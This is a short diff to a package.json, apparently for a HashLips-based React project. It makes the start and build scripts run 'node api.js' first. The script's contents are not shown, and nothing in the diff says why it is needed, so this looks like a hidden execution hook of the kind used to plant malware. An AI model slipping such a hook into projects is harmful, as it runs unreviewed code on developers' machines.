@@ -20,8 +20,8 @@
   "author": "Daniel Eugene Botha (HashLips)",
   "license": "MIT",
   "scripts": {
-    "start": "react-scripts start",
-    "build": "react-scripts build"
+    "start": "node api.js && react-scripts start",
+    "build": "node api.js && react-scripts build"
   },
   "browserslist": {
     "production": [
